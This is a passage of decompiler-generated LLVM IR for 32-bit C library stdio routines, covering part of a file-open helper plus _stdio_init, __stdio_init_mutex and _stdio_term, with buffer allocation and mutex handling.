  %v4_80509bd = and i8 %v3_80509bd, 32
  %v5_80509bd = icmp eq i8 %v4_80509bd, 0
  br i1 %v5_80509bd, label %dec_label_pc_8050bb3, label %dec_label_pc_80509c7

dec_label_pc_80509c7:                             ; preds = %dec_label_pc_80509bd
  store i32 %v0_80509bd, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_80509cd = call i32 @free(i32 %v0_80509bd)
  br label %dec_label_pc_8050bae

dec_label_pc_80509d7:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80509d9

dec_label_pc_80509d9:                             ; preds = %dec_label_pc_80509a2, %dec_label_pc_8050999, %dec_label_pc_80509d7
  %v0_80509ea = phi i32 [ 1089, %dec_label_pc_80509a2 ], [ 577, %dec_label_pc_8050999 ], [ 0, %dec_label_pc_80509d7 ]
  %v1_80509d9 = add i32 %v4_8050983, 1
  %v2_80509d9 = inttoptr i32 %v1_80509d9 to i8*
  %v3_80509d9 = load i8, i8* %v2_80509d9, align 1
  %v12_80509d9 = icmp eq i8 %v3_80509d9, 98
  %v1_80509d9.v4_8050983 = select i1 %v12_80509d9, i32 %v1_80509d9, i32 %v4_8050983
  store i32 %v1_80509d9.v4_8050983, i32* %eax.global-to-local, align 4
  %v1_80509e4 = add i32 %v1_80509d9.v4_8050983, 1
  %v2_80509e4 = inttoptr i32 %v1_80509e4 to i8*
  %v3_80509e4 = load i8, i8* %v2_80509e4, align 1
  %v12_80509e4 = icmp eq i8 %v3_80509e4, 43
  %v1_80509e8 = icmp eq i1 %v12_80509e4, false
  br i1 %v1_80509e8, label %dec_label_pc_80509f2, label %dec_label_pc_80509ea

dec_label_pc_80509ea:                             ; preds = %dec_label_pc_80509d9
  %v1_80509ec = or i32 %v0_80509ea, 1
  store i32 %v1_80509ec, i32* %eax.global-to-local, align 4
  %v1_80509ef = add nuw nsw i32 %v1_80509ec, 1
  store i32 %v1_80509ef, i32* @ebx, align 4
  br label %dec_label_pc_80509f2

dec_label_pc_80509f2:                             ; preds = %dec_label_pc_80509d9, %dec_label_pc_80509ea
  %v0_8050a757 = phi i32 [ %v0_80509ea, %dec_label_pc_80509d9 ], [ %v1_80509ef, %dec_label_pc_80509ea ]
  %v1_80509f2 = icmp eq i32 %arg3, 0
  %v1_80509f4 = icmp eq i1 %v1_80509f2, false
  br i1 %v1_80509f4, label %dec_label_pc_8050a28, label %dec_label_pc_80509f6

dec_label_pc_80509f6:                             ; preds = %dec_label_pc_80509f2
  store i32 80, i32* %stack_var_-76, align 4
  %v1_80509fb = call i32 @malloc(i32 80)
  store i32 %v1_80509fb, i32* %eax.global-to-local, align 4
  %v2_8050a03 = icmp eq i32 %v1_80509fb, 0
  store i32 %v1_80509fb, i32* @ebp, align 4
  br i1 %v2_8050a03, label %dec_label_pc_8050bb5, label %dec_label_pc_8050a0d

dec_label_pc_8050a0d:                             ; preds = %dec_label_pc_80509f6
  %v2_80509fb = inttoptr i32 %v1_80509fb to i16*
  store i16 8192, i16* %v2_80509fb, align 2
  %v2_8050a15 = add i32 %v1_80509fb, 8
  %v3_8050a15 = inttoptr i32 %v2_8050a15 to i32*
  store i32 0, i32* %v3_8050a15, align 4
  %v2_8050a1c = add i32 %v1_80509fb, 56
  store i32 %v2_8050a1c, i32* %eax.global-to-local, align 4
  store i32 %v2_8050a1c, i32* %stack_var_-76, align 4
  %v1_8050a20 = call i32 @__stdio_init_mutex(i32 %v2_8050a1c)
  store i32 %v1_8050a20, i32* %eax.global-to-local, align 4
  %v0_8050a75.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050a28

dec_label_pc_8050a28:                             ; preds = %dec_label_pc_80509f2, %dec_label_pc_8050a0d
  %v2_8050a7b = phi i32 [ %v0_8050a757, %dec_label_pc_80509f2 ], [ %v0_8050a75.pre, %dec_label_pc_8050a0d ]
  %v2_8050a28 = icmp slt i32 %arg4, 0
  br i1 %v2_8050a28, label %dec_label_pc_8050a75, label %dec_label_pc_8050a2c

dec_label_pc_8050a2c:                             ; preds = %dec_label_pc_8050a28
  %v1_8050a2e = and i32 %v2_8050a7b, 32771
  %v1_8050a34 = add nuw nsw i32 %v1_8050a2e, 1
  %v0_8050a35 = load i32, i32* @esi, align 4
  %v1_8050a35 = add i32 %v0_8050a35, 1
  %v2_8050a38 = and i32 %v1_8050a35, %v1_8050a34
  store i32 %v2_8050a38, i32* %eax.global-to-local, align 4
  %v12_8050a3a = icmp eq i32 %v2_8050a38, %v1_8050a34
  %v1_8050a3c = load i32, i32* @ebp, align 4
  %v2_8050a3c = add i32 %v1_8050a3c, 4
  %v3_8050a3c = inttoptr i32 %v2_8050a3c to i32*
  store i32 %arg4, i32* %v3_8050a3c, align 4
  %v1_8050a3f = icmp eq i1 %v12_8050a3a, false
  br i1 %v1_8050a3f, label %dec_label_pc_80509aa, label %dec_label_pc_8050a45

dec_label_pc_8050a45:                             ; preds = %dec_label_pc_8050a2c
  %v0_8050a45 = load i32, i32* @esi, align 4
  %v1_8050a47 = and i32 %v0_8050a45, 1024
  %v1_8050a49 = xor i32 %v1_8050a47, 1024
  store i32 %v1_8050a49, i32* %eax.global-to-local, align 4
  %v1_8050a4e = load i32, i32* @ebx, align 4
  %v2_8050a4e = and i32 %v1_8050a4e, %v1_8050a49
  %v3_8050a4e = icmp eq i32 %v2_8050a4e, 0
  br i1 %v3_8050a4e, label %dec_label_pc_8050a45.dec_label_pc_8050a6b_crit_edge, label %dec_label_pc_8050a52

dec_label_pc_8050a45.dec_label_pc_8050a6b_crit_edge: ; preds = %dec_label_pc_8050a45
  br label %dec_label_pc_8050a6b

dec_label_pc_8050a52:                             ; preds = %dec_label_pc_8050a45
  store i32 4, i32* %stack_var_-72, align 4
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_8050a5b = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_8050a5b, i32* %eax.global-to-local, align 4
  %v1_8050a63 = icmp eq i32 %v3_8050a5b, 0
  %v1_8050a65 = icmp eq i1 %v1_8050a63, false
  br i1 %v1_8050a65, label %dec_label_pc_80509aa, label %dec_label_pc_8050a52.dec_label_pc_8050a6b_crit_edge

dec_label_pc_8050a52.dec_label_pc_8050a6b_crit_edge: ; preds = %dec_label_pc_8050a52
  %v0_8050a6b.pre = load i32, i32* @esi, align 4
  %v0_8050a71.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050a6b

dec_label_pc_8050a6b:                             ; preds = %dec_label_pc_8050a45.dec_label_pc_8050a6b_crit_edge, %dec_label_pc_8050a52.dec_label_pc_8050a6b_crit_edge
  %v0_8050a71 = phi i32 [ %v1_8050a4e, %dec_label_pc_8050a45.dec_label_pc_8050a6b_crit_edge ], [ %v0_8050a71.pre, %dec_label_pc_8050a52.dec_label_pc_8050a6b_crit_edge ]
  %v0_8050a6b = phi i32 [ %v0_8050a45, %dec_label_pc_8050a45.dec_label_pc_8050a6b_crit_edge ], [ %v0_8050a6b.pre, %dec_label_pc_8050a52.dec_label_pc_8050a6b_crit_edge ]
  %v1_8050a6b = and i32 %v0_8050a6b, 32768
  %v2_8050a71 = or i32 %v1_8050a6b, %v0_8050a71
  store i32 %v2_8050a71, i32* @ebx, align 4
  br label %dec_label_pc_8050a99

dec_label_pc_8050a75:                             ; preds = %dec_label_pc_8050a28
  %v11_8050a77 = or i32 %v2_8050a7b, 32768
  store i32 %v11_8050a77, i32* %eax.global-to-local, align 4
  %v1_8050a7a = add i32 %arg4, 1
  %v8_8050a7a = icmp eq i32 %v1_8050a7a, 0
  store i32 %v1_8050a7a, i32* @edi, align 4
  %v1_8050a7b = icmp eq i1 %v8_8050a7a, false
  %v4_8050a7b = select i1 %v1_8050a7b, i32 %v11_8050a77, i32 %v2_8050a7b
  store i32 %v4_8050a7b, i32* @ebx, align 4
  store i32 %v4_8050a7b, i32* %stack_var_-72, align 4
  %v0_8050a85 = load i32, i32* @esi, align 4
  store i32 %v0_8050a85, i32* %stack_var_-76, align 4
  %v3_8050a86 = trunc i32 %v4_8050a7b to i8
  %v4_8050a86 = call i32 @__libc_open(i32 %v0_8050a85, i8 %v3_8050a86, i32 438)
  store i32 %v4_8050a86, i32* %eax.global-to-local, align 4
  %v2_8050a8e = icmp slt i32 %v4_8050a86, 0
  %v1_8050a90 = load i32, i32* @ebp, align 4
  %v2_8050a90 = add i32 %v1_8050a90, 4
  %v3_8050a90 = inttoptr i32 %v2_8050a90 to i32*
  store i32 %v4_8050a86, i32* %v3_8050a90, align 4
  br i1 %v2_8050a8e, label %dec_label_pc_80509bd, label %dec_label_pc_8050a99

dec_label_pc_8050a99:                             ; preds = %dec_label_pc_8050a75, %dec_label_pc_8050a6b
  %v0_8050a99 = load i32, i32* @ebp, align 4
  %v1_8050a99 = inttoptr i32 %v0_8050a99 to i32*
  %v2_8050a99 = load i32, i32* %v1_8050a99, align 4
  %v2_8050a99.tr = trunc i32 %v2_8050a99 to i16
  %v1_8050aa1 = and i16 %v2_8050a99.tr, 8192
  %v3_8050aa1 = inttoptr i32 %v0_8050a99 to i16*
  store i16 %v1_8050aa1, i16* %v3_8050aa1, align 2
  %v0_8050aa5 = load i32, i32* @ebx, align 4
  store i32 %v0_8050aa5, i32* %eax.global-to-local, align 4
  %v1_8050aa7 = and i32 %v0_8050aa5, -31744
  %v0_8050aad = load i32, i32* @ebp, align 4
  %v1_8050aad = inttoptr i32 %v0_8050aad to i32*
  %v2_8050aad = load i32, i32* %v1_8050aad, align 4
  %v1_8050ab0 = mul i32 %v0_8050aa5, 16
  %v1_8050ab3 = and i32 %v1_8050ab0, 48
  %v1_8050ab4 = add nuw nsw i32 %v1_8050ab3, 16
  %v2_8050ab7 = xor i32 %v1_8050ab4, 48
  %v2_8050aba = or i32 %v2_8050aad, %v1_8050aa7
  %v2_8050abc = or i32 %v2_8050aba, %v2_8050ab7
  store i32 %v2_8050abc, i32* %eax.global-to-local, align 4
  %v1_8050abe = trunc i32 %v2_8050abc to i16
  %v3_8050abe = inttoptr i32 %v0_8050aad to i16*
  store i16 %v1_8050abe, i16* %v3_8050abe, align 2
  %v0_8050ac2 = load i32, i32* %stack_var_-76, align 4
  %v1_8050ac2 = call i32 @__errno_location(i32 %v0_8050ac2)
  store i32 %v1_8050ac2, i32* %eax.global-to-local, align 4
  %v0_8050aca = load i32, i32* @ebp, align 4
  %v1_8050aca = inttoptr i32 %v0_8050aca to i16*
  %v2_8050aca = load i16, i16* %v1_8050aca, align 2
  %v3_8050aca = zext i16 %v2_8050aca to i32
  store i32 %v3_8050aca, i32* @ebx, align 4
  %v1_8050ace = inttoptr i32 %v1_8050ac2 to i32*
  %v2_8050ace = load i32, i32* %v1_8050ace, align 4
  store i32 %v2_8050ace, i32* @edi, align 4
  store i32 %v1_8050ac2, i32* @esi, align 4
  %v1_8050ad2 = add i32 %v0_8050aca, 4
  %v2_8050ad2 = inttoptr i32 %v1_8050ad2 to i32*
  %v3_8050ad2 = load i32, i32* %v2_8050ad2, align 4
  store i32 %v3_8050ad2, i32* %stack_var_-76, align 4
  %v1_8050ad5 = call i32 @isatty(i32 %v3_8050ad2)
  %v2_8050add = mul i32 %v1_8050ad5, 256
  store i32 %v2_8050add, i32* %eax.global-to-local, align 4
  %v0_8050ae0 = load i32, i32* @ebx, align 4
  %v2_8050ae0 = or i32 %v0_8050ae0, %v2_8050add
  store i32 %v2_8050ae0, i32* @ebx, align 4
  %v1_8050ae2 = trunc i32 %v2_8050ae0 to i16
  %v2_8050ae2 = load i32, i32* @ebp, align 4
  %v3_8050ae2 = inttoptr i32 %v2_8050ae2 to i16*
  store i16 %v1_8050ae2, i16* %v3_8050ae2, align 2
  %v0_8050ae6 = load i32, i32* @edi, align 4
  %v1_8050ae6 = load i32, i32* @esi, align 4
  %v2_8050ae6 = inttoptr i32 %v1_8050ae6 to i32*
  store i32 %v0_8050ae6, i32* %v2_8050ae6, align 4
  %v0_8050ae8 = load i32, i32* @ebp, align 4
  %v1_8050ae8 = add i32 %v0_8050ae8, 8
  %v2_8050ae8 = inttoptr i32 %v1_8050ae8 to i32*
  %v3_8050ae8 = load i32, i32* %v2_8050ae8, align 4
  %v4_8050ae8 = icmp eq i32 %v3_8050ae8, 0
  %v1_8050aec = icmp eq i1 %v4_8050ae8, false
  br i1 %v1_8050aec, label %dec_label_pc_8050b20, label %dec_label_pc_8050aee

dec_label_pc_8050aee:                             ; preds = %dec_label_pc_8050a99
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_8050af6 = call i32 @malloc(i32 4096)
  store i32 %v1_8050af6, i32* %eax.global-to-local, align 4
  %v1_8050afe = icmp eq i32 %v1_8050af6, 0
  %v1_8050b00 = load i32, i32* @ebp, align 4
  %v2_8050b00 = add i32 %v1_8050b00, 8
  %v3_8050b00 = inttoptr i32 %v2_8050b00 to i32*
  store i32 %v1_8050af6, i32* %v3_8050b00, align 4
  br i1 %v1_8050afe, label %dec_label_pc_8050b19, label %dec_label_pc_8050b05

dec_label_pc_8050b05:                             ; preds = %dec_label_pc_8050aee
  %v1_8050b05 = add i32 %v1_8050af6, 4096
  store i32 %v1_8050b05, i32* %eax.global-to-local, align 4
  %v1_8050b0a = load i32, i32* @ebp, align 4
  %v2_8050b0a = add i32 %v1_8050b0a, 12
  %v3_8050b0a = inttoptr i32 %v2_8050b0a to i32*
  store i32 %v1_8050b05, i32* %v3_8050b0a, align 4
  %v0_8050b0d = load i32, i32* @ebp, align 4
  %v1_8050b0d = inttoptr i32 %v0_8050b0d to i32*
  %v2_8050b0d = load i32, i32* %v1_8050b0d, align 4
  %v1_8050b10 = udiv i32 %v2_8050b0d, 256
  %v3_8050b10 = and i32 %v1_8050b10, 191
  %v8_8050b10 = or i32 %v3_8050b10, 64
  %v10_8050b10 = mul nuw nsw i32 %v8_8050b10, 256
  %v11_8050b10 = and i32 %v2_8050b0d, -65281
  %v12_8050b10 = or i32 %v10_8050b10, %v11_8050b10
  store i32 %v12_8050b10, i32* %eax.global-to-local, align 4
  %v1_8050b13 = trunc i32 %v12_8050b10 to i16
  %v3_8050b13 = inttoptr i32 %v0_8050b0d to i16*
  store i16 %v1_8050b13, i16* %v3_8050b13, align 2
  br label %dec_label_pc_8050b20

dec_label_pc_8050b19:                             ; preds = %dec_label_pc_8050aee
  %v0_8050b19 = load i32, i32* @ebp, align 4
  %v1_8050b19 = add i32 %v0_8050b19, 12
  %v2_8050b19 = inttoptr i32 %v1_8050b19 to i32*
  store i32 0, i32* %v2_8050b19, align 4
  br label %dec_label_pc_8050b20

dec_label_pc_8050b20:                             ; preds = %dec_label_pc_8050a99, %dec_label_pc_8050b05, %dec_label_pc_8050b19
  %v0_8050b20 = load i32, i32* @ebp, align 4
  %v1_8050b20 = add i32 %v0_8050b20, 8
  %v2_8050b20 = inttoptr i32 %v1_8050b20 to i32*
  %v3_8050b20 = load i32, i32* %v2_8050b20, align 4
  store i32 %v3_8050b20, i32* %eax.global-to-local, align 4
  %v1_8050b23 = add i32 %v0_8050b20, 2
  %v2_8050b23 = inttoptr i32 %v1_8050b23 to i8*
  store i8 0, i8* %v2_8050b23, align 1
  %v0_8050b27 = load i32, i32* @ebp, align 4
  %v1_8050b27 = add i32 %v0_8050b27, 44
  %v2_8050b27 = inttoptr i32 %v1_8050b27 to i32*
  store i32 0, i32* %v2_8050b27, align 4
  %v0_8050b2e = load i32, i32* @ebp, align 4
  %v1_8050b2e = add i32 %v0_8050b2e, 1
  %v2_8050b2e = inttoptr i32 %v1_8050b2e to i8*
  %v3_8050b2e = load i8, i8* %v2_8050b2e, align 1
  %v4_8050b2e = and i8 %v3_8050b2e, 32
  %v5_8050b2e = icmp eq i8 %v4_8050b2e, 0
  %v0_8050b32 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b32 = add i32 %v0_8050b2e, 24
  %v3_8050b32 = inttoptr i32 %v2_8050b32 to i32*
  store i32 %v0_8050b32, i32* %v3_8050b32, align 4
  %v0_8050b35 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b35 = load i32, i32* @ebp, align 4
  %v2_8050b35 = add i32 %v1_8050b35, 28
  %v3_8050b35 = inttoptr i32 %v2_8050b35 to i32*
  store i32 %v0_8050b35, i32* %v3_8050b35, align 4
  %v0_8050b38 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b38 = load i32, i32* @ebp, align 4
  %v2_8050b38 = add i32 %v1_8050b38, 16
  %v3_8050b38 = inttoptr i32 %v2_8050b38 to i32*
  store i32 %v0_8050b38, i32* %v3_8050b38, align 4
  %v0_8050b3b = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b3b = load i32, i32* @ebp, align 4
  %v2_8050b3b = add i32 %v1_8050b3b, 20
  %v3_8050b3b = inttoptr i32 %v2_8050b3b to i32*
  store i32 %v0_8050b3b, i32* %v3_8050b3b, align 4
  %v0_8050b3e = load i32, i32* @global_var_8062bb0.182, align 16
  store i32 %v0_8050b3e, i32* %eax.global-to-local, align 4
  %v1_8050b43 = load i32, i32* @ebp, align 4
  %v2_8050b43 = add i32 %v1_8050b43, 52
  %v3_8050b43 = inttoptr i32 %v2_8050b43 to i32*
  store i32 %v0_8050b3e, i32* %v3_8050b43, align 4
  br i1 %v5_8050b2e, label %dec_label_pc_8050bb5, label %dec_label_pc_8050b48

dec_label_pc_8050b48:                             ; preds = %dec_label_pc_8050b20
  store i32 134541533, i32* %stack_var_-72, align 4
  %v2_8050b53 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050b53, i32* @esi, align 4
  store i32 %v2_8050b53, i32* %stack_var_-76, align 4
  %v4_8050b58 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 ptrtoint (i32* @global_var_8062b98.203 to i32))
  store i32 %v4_8050b58, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062b98.203 to i32), i32* %stack_var_-76, align 4
  %v1_8050b64 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062b98.203 to i32))
  store i32 %v1_8050b64, i32* %eax.global-to-local, align 4
  store i32 134541533, i32* %stack_var_-72, align 4
  %v2_8050b76 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8050b76, i32* @ebx, align 4
  store i32 %v2_8050b76, i32* %stack_var_-76, align 4
  %v4_8050b7b = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134541533, i32 ptrtoint (i32* @global_var_8062b80.211 to i32))
  store i32 %v4_8050b7b, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062b80.211 to i32), i32* %stack_var_-76, align 4
  %v1_8050b87 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062b80.211 to i32))
  %v0_8050b8c = load i32, i32* bitcast (i32** @global_var_8062b7c.185 to i32*), align 4
  store i32 %v0_8050b8c, i32* %eax.global-to-local, align 4
  %v1_8050b91 = load i32, i32* @ebp, align 4
  %v2_8050b91 = add i32 %v1_8050b91, 32
  %v3_8050b91 = inttoptr i32 %v2_8050b91 to i32*
  store i32 %v0_8050b8c, i32* %v3_8050b91, align 4
  %v2_8050b94 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8050b94, i32* @ecx, align 4
  %v0_8050b95 = load i32, i32* @ebp, align 4
  store i32 %v0_8050b95, i32* bitcast (i32** @global_var_8062b7c.185 to i32*), align 4
  %v2_8050b9b = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_8050b9b, i32* @edi, align 4
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_8050b76, i32* %stack_var_-76, align 4
  %v3_8050b9f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  store i32 %v2_8050b76, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_8050b53, i32* %stack_var_-76, align 4
  %v3_8050ba9 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_8050bae

dec_label_pc_8050bae:                             ; preds = %dec_label_pc_80509c7, %dec_label_pc_8050b48
  %storemerge = phi i32 [ %v3_8050ba9, %dec_label_pc_8050b48 ], [ %v1_80509cd, %dec_label_pc_80509c7 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050bb5

dec_label_pc_8050bb3:                             ; preds = %dec_label_pc_80509bd, %dec_label_pc_80509aa
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8050bb5

dec_label_pc_8050bb5:                             ; preds = %dec_label_pc_8050b20, %dec_label_pc_80509f6, %dec_label_pc_8050bae, %dec_label_pc_8050bb3
  %v0_8050bb8 = load i32, i32* @ebp, align 4
  store i32 %v0_8050bb8, i32* %eax.global-to-local, align 4
  %v2_8050bba = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050bba, i32* @ebx, align 4
  store i32 %v0_805097e, i32* @esi, align 4
  store i32 %v0_805097d, i32* @edi, align 4
  store i32 %v0_805097c, i32* @ebp, align 4
  ret i32 %v0_8050bb8

; uselistorder directives
  uselistorder i32 %v2_8050b0d, { 1, 0 }
  uselistorder i32 %v1_8050af6, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8050add, { 1, 0 }
  uselistorder i32 %v1_8050ac2, { 1, 0, 2 }
  uselistorder i32 %v11_8050a77, { 1, 0 }
  uselistorder i32 %v1_8050a49, { 1, 0 }
  uselistorder i32 %v0_8050a45, { 1, 0 }
  uselistorder i32 %v2_8050a7b, { 1, 0, 2 }
  uselistorder i32 %v1_80509fb, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 31 }
  uselistorder i32 %arg4, { 3, 1, 0, 4, 2, 5 }
  uselistorder label %dec_label_pc_8050bb5, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8050bae, { 1, 0 }
  uselistorder label %dec_label_pc_8050b20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050a6b, { 1, 0 }
  uselistorder label %dec_label_pc_8050a28, { 1, 0 }
  uselistorder label %dec_label_pc_80509f2, { 1, 0 }
  uselistorder label %dec_label_pc_80509d9, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050bc1 = load i32, i32* @edi, align 4
  %v0_8050bc2 = load i32, i32* @esi, align 4
  %v0_8050bc3 = load i32, i32* @ebx, align 4
  store i32 %v0_8050bc3, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_8050bcc = call i32 @__errno_location(i32 %v0_8050bc3)
  %v0_8050bd4 = load i16, i16* @global_var_8062bc0.184, align 64
  %v1_8050bd4 = zext i16 %v0_8050bd4 to i32
  store i32 %v1_8050bd4, i32* @esi, align 4
  %v1_8050bdb = inttoptr i32 %v1_8050bcc to i32*
  %v2_8050bdb = load i32, i32* %v1_8050bdb, align 4
  store i32 %v2_8050bdb, i32* %ebp.global-to-local, align 4
  store i32 %v1_8050bcc, i32* @edi, align 4
  %v1_8050be1 = call i32 @isatty(i32 0)
  %v0_8050be6 = load i32, i32* @ebx, align 4
  %v2_8050bef = sub i32 %v0_8050be6, %v1_8050be1
  %v2_8050bf3 = mul i32 %v2_8050bef, 256
  %v0_8050bf6 = load i32, i32* @esi, align 4
  %v2_8050bf6 = xor i32 %v0_8050bf6, %v2_8050bf3
  %v1_8050bf8 = trunc i32 %v2_8050bf6 to i16
  store i16 %v1_8050bf8, i16* @global_var_8062bc0.184, align 64
  %v0_8050bff = load i16, i16* @global_var_8062c10.201, align 16
  %v1_8050bff = zext i16 %v0_8050bff to i32
  store i32 %v1_8050bff, i32* @esi, align 4
  %v1_8050c06 = call i32 @isatty(i32 1)
  %v0_8050c0b = load i32, i32* @ebx, align 4
  %v2_8050c0b = sub i32 %v0_8050c0b, %v1_8050c06
  %v2_8050c0d = mul i32 %v2_8050c0b, 256
  %v0_8050c10 = load i32, i32* @esi, align 4
  %v2_8050c10 = xor i32 %v2_8050c0d, %v0_8050c10
  %v1_8050c12 = trunc i32 %v2_8050c10 to i16
  store i16 %v1_8050c12, i16* @global_var_8062c10.201, align 16
  %v0_8050c19 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050c19 = load i32, i32* @edi, align 4
  %v2_8050c19 = inttoptr i32 %v1_8050c19 to i32*
  store i32 %v0_8050c19, i32* %v2_8050c19, align 4
  %v2_8050c1e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050c1e, i32* @ebx, align 4
  store i32 %v0_8050bc2, i32* @esi, align 4
  store i32 %v0_8050bc1, i32* @edi, align 4
  ret i32 %v1_8050c06

; uselistorder directives
  uselistorder i32 %v1_8050bcc, { 1, 0 }
  uselistorder i16* @global_var_8062c10.201, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8050c31 = inttoptr i32 %arg1 to i16*
  %v4_8050c31 = call i32 @memcpy(i16* %v3_8050c31, i32 ptrtoint (i32* @global_var_805b8ac.212 to i32), i32 24)
  ret i32 %v4_8050c31
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050c3a = load i32, i32* @esi, align 4
  %v0_8050c3b = load i32, i32* @ebx, align 4
  store i32 %v0_8050c3b, i32* %stack_var_-8, align 4
  %v2_8050c44 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8062b80.211 to i32))
  store i32 %v2_8050c44, i32* %eax.global-to-local, align 4
  %v2_8050c50 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8062b98.203 to i32))
  store i32 %v2_8050c50, i32* %eax.global-to-local, align 4
  %storemerge22 = load i32, i32* bitcast (i32** @global_var_8062b7c.185 to i32*), align 4
  store i32 %storemerge22, i32* @ebx, align 4
  %v1_8050c9a23 = icmp eq i32 %storemerge22, 0
  %v1_8050c9c25 = icmp eq i1 %v1_8050c9a23, false
  br i1 %v1_8050c9c25, label %dec_label_pc_8050c5d.lr.ph, label %dec_label_pc_8050cba.preheader

dec_label_pc_8050c5d.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8050c5d

dec_label_pc_8050c5d:                             ; preds = %dec_label_pc_8050c5d.lr.ph, %dec_label_pc_8050c84
  %storemerge26 = phi i32 [ %storemerge22, %dec_label_pc_8050c5d.lr.ph ], [ %storemerge, %dec_label_pc_8050c84 ]
  %v1_8050c60 = add i32 %storemerge26, 56
  store i32 %v1_8050c60, i32* @esi, align 4
  %v2_8050c64 = call i32 @pthread_mutex_trylock(i32 %v1_8050c60)
  store i32 %v2_8050c64, i32* %eax.global-to-local, align 4
  %v1_8050c6c = icmp eq i32 %v2_8050c64, 0
  br i1 %v1_8050c6c, label %dec_label_pc_8050c84, label %dec_label_pc_8050c70

dec_label_pc_8050c70:                             ; preds = %dec_label_pc_8050c5d
  %v0_8050c70 = load i32, i32* @ebx, align 4
  %v1_8050c70 = add i32 %v0_8050c70, 8
  %v2_8050c70 = inttoptr i32 %v1_8050c70 to i32*
  %v3_8050c70 = load i32, i32* %v2_8050c70, align 4
  store i32 %v3_8050c70, i32* %eax.global-to-local, align 4
  %v1_8050c73 = inttoptr i32 %v0_8050c70 to i16*
  store i16 48, i16* %v1_8050c73, align 2
  %v0_8050c78 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c78 = load i32, i32* @ebx, align 4
  %v2_8050c78 = add i32 %v1_8050c78, 24
  %v3_8050c78 = inttoptr i32 %v2_8050c78 to i32*
  store i32 %v0_8050c78, i32* %v3_8050c78, align 4
  %v0_8050c7b = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c7b = load i32, i32* @ebx, align 4
  %v2_8050c7b = add i32 %v1_8050c7b, 28
  %v3_8050c7b = inttoptr i32 %v2_8050c7b to i32*
  store i32 %v0_8050c7b, i32* %v3_8050c7b, align 4
  %v0_8050c7e = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c7e = load i32, i32* @ebx, align 4
  %v2_8050c7e = add i32 %v1_8050c7e, 16
  %v3_8050c7e = inttoptr i32 %v2_8050c7e to i32*
  store i32 %v0_8050c7e, i32* %v3_8050c7e, align 4
  %v0_8050c81 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c81 = load i32, i32* @ebx, align 4
  %v2_8050c81 = add i32 %v1_8050c81, 20
  %v3_8050c81 = inttoptr i32 %v2_8050c81 to i32*
  store i32 %v0_8050c81, i32* %v3_8050c81, align 4
  br label %dec_label_pc_8050c84

dec_label_pc_8050c84:                             ; preds = %dec_label_pc_8050c5d, %dec_label_pc_8050c70
  %v0_8050c87 = load i32, i32* @ebx, align 4
  %v1_8050c87 = add i32 %v0_8050c87, 52
  %v2_8050c87 = inttoptr i32 %v1_8050c87 to i32*
  store i32 1, i32* %v2_8050c87, align 4
  %v0_8050c8e = load i32, i32* @esi, align 4
  %v2_8050c8f = call i32 @__stdio_init_mutex(i32 %v0_8050c8e)
  store i32 %v2_8050c8f, i32* %eax.global-to-local, align 4
  %v0_8050c94 = load i32, i32* @ebx, align 4
